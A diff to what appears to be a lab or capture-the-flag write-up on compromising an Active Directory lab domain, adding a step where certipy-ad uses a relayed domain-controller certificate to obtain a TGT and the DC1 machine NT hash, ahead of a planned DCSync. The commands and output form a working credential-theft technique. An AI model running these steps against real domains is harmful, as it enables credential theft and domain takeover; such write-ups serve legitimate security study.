@@ -726,7 +726,28 @@ Ill also specify my listener so that ntlmrelayx can relay the auth to dc2
 ```
 After a moment of running nxc i get a certificate for dc1 back from ntlmrelayx
 
-From here i can either perform a DCSync with a certificate or i can grab the NTLM
+From here i can either perform a DCSync with a certificate or i can grab the NTLM then do a DCSync using the NTLM
+
+```python
+certipy-ad auth -pfx DC1.pfx -dc-ip 10.1.139.227                                                          
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'DC1$@dismay.hsm'
+[*]     Security Extension SID: 'S-1-5-21-1359501962-4064634841-3558559731-1000'
+[*] Using principal: 'dc1$@dismay.hsm'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc1.ccache'
+[*] Wrote credential cache to 'dc1.ccache'
+[*] Trying to retrieve NT hash for 'dc1$'
+[*] Got hash for 'dc1$@dismay.hsm': aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0
+```
+Now i have DC1 NTLM hash i can dump all the secrets
+
+```python
+
+```
 
 
 
